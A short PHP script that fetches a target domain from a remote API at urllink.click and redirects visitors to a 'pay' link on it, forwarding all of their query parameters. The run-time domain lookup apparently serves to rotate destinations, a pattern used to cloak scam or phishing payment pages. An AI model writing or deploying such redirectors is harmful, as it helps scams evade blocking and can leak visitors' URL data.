<?php

$domains = @json_decode(@file_get_contents('https://urllink.click/apiRequest/domainsGet/'), true);

if (empty($domains) || empty($domains['public_domain'])) {
    exit("Error get api domain");
}

$pay_link = $domains['public_domain'] . 'public/1801103836294321';

if (!empty($_GET)) {
    $pay_link .= '?' . http_build_query($_GET);
}

header('Location: ' . $pay_link);
exit();